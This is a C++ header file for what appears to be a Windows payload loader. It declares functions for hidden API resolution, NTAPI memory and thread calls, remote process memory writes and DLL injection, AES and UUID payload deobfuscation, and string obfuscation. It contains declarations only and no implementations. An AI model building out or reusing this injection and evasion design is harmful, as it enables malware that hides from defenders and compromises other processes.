#pragma comment(lib, "Bcrypt.lib")

#ifndef FUNCTIONS_H
#define FUNCTIONS_H

#ifdef max
#undef max
#endif

/* -------- INCLUDES --------*/
#include <Windows.h>
#include <cstdarg> 
#include <stdio.h>
#include <iostream>
#include <cstring>
#include <TlHelp32.h>
#include <cstdio>
#include <bcrypt.h>
//#include <winsock2.h>
//#include <ws2tcpip.h>
#include <io.h>
#include <fcntl.h>
#include <string>
#include <locale>
#include <codecvt>
#include <csignal>
#include <stdexcept>
#include <wchar.h>
#include <limits>
using namespace std;


/* [-------- Global Variables -------] */
extern char big_string[];
extern char big_numbers[];
/* [-------- FUNCTION MACROS --------] */

/* Macros for rockyPrintColor */
#define rockyColor(baseColor) (FOREGROUND_##baseColor)
#define rockyColorBase(baseColor) (FOREGROUND_##baseColor | FOREGROUND_INTENSITY)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

/* [CUSTOM GetModuleHandle https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record] */
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((PCHAR)(address) - (ULONG_PTR)(&((type *)0)->field)))

/* For AES Decryption */
#define KEYSIZE	32
#define IVSIZE	16

/* Macros for use with the NTAPI */
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_NOT_FOUND ((NTSTATUS)0xC0000225L) // Status code for not found
#define STATUS_DLL_NOT_FOUND ((NTSTATUS)0xC0000135L) // Status code for DLL not found

/* Macros for Initialise Object Attributs for rockyCreateThread */
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
/* [-------- CUSTOM FUNCTIONS --------] */


/* [CUSTOM: rockyGetModuleHandle (GetModuleHandle)]*/
HMODULE rockyGetModuleHandle(IN LPCWSTR szModuleName);
HMODULE rockyGetModuleHandle2(IN LPCWSTR szModuleName);

/* [CUSTOM: rockyGetProcAddress (GetProcAddress)] */
void* rockyGetProcAddress(HMODULE hModule, const char* functionName);

/* [CUSTOM: rockyPrintColor (printf())]*/
enum ConsoleColor {
	red = rockyColorBase(RED),
	green = rockyColorBase(GREEN),
	blue = rockyColorBase(BLUE),
	yellow = rockyColor(RED) | rockyColorBase(GREEN),
	purple = rockyColor(RED) | rockyColorBase(BLUE),
	white = rockyColor(RED) | rockyColor(GREEN) | rockyColorBase(BLUE),
	grey = rockyColor(RED) | rockyColor(GREEN) | rockyColor(BLUE),
	default_color = 15
};
void rockyPrintColor(ConsoleColor color, const char* format, ...);

/* [CUSTOM: rockyAlloc (Alloc)] */
NTSTATUS rockyAlloc(const void* data, size_t size, void** outAddress);
NTSTATUS rockyAlloc(const char* stringData, void** outAddress);

/* [CUSTOM: rockyLoadLibrary (LoadLibrary)] */
void* rockyLoadLibrary(const wchar_t* dllName);

/* [CUSTOM: rockyDealloc (Dealloc)] */
NTSTATUS rockyDealloc(void* pAddress);

NTSTATUS rockyNtClose(HANDLE handle);
/* [CUSTOM: rockyPrintAllocated (Show Payload)]*/
void rockyPrintAllocated(const void* pAddress, size_t size);

/* [CUSTOM rockyObfuscation and GetString (Obfuscator)] */
string rockyGetString(int offsets[], char* big_string, int sizeof_offset);
void rockyObfuscation(char* big_string, char* original_string);

/* [CUSTOM convert strings to Wstring] */
wstring stringToWstring(const string& str);

/* [CUSTOM: rockyVirtualProtect function] */
NTSTATUS rockyVirtualProtect(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect);
/* [CUSTOM: rockyCreateThread function] */
NTSTATUS rockyCreateThreadEx(_Out_ PHANDLE ThreadHandle,_In_ ACCESS_MASK DesiredAccess,_In_opt_ POBJECT_ATTRIBUTES64 ObjectAttributes,_In_ HANDLE ProcessHandle,_In_ LPTHREAD_START_ROUTINE StartRoutine,_In_opt_ PVOID Argument,_In_ ULONG CreateFlags,_In_ SIZE_T ZeroBits,_In_ SIZE_T StackSize,_In_ SIZE_T MaximumStackSize,_In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

LPVOID rockyVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

BOOL rockyWriteToProcessMemory(HANDLE hProcess, PVOID address, PVOID data, SIZE_T size, SIZE_T* bytesWritten);
BOOL rockyInjectDLL(HANDLE hProcess, LPWSTR DllName);
/* [CUSTOM AES functions] */
BOOL InstallAesDecryption(PAES pAes);
BOOL InstallAesEncryption(PAES pAes);
BOOL rockyAes_decrypt(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize);
BOOL rockyAes_encrypt(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize);
BOOL rockyUUID_Deobfuscator(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize);



BOOL rockyGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess);
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize);
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size);

#endif // FUNCTIONS_H
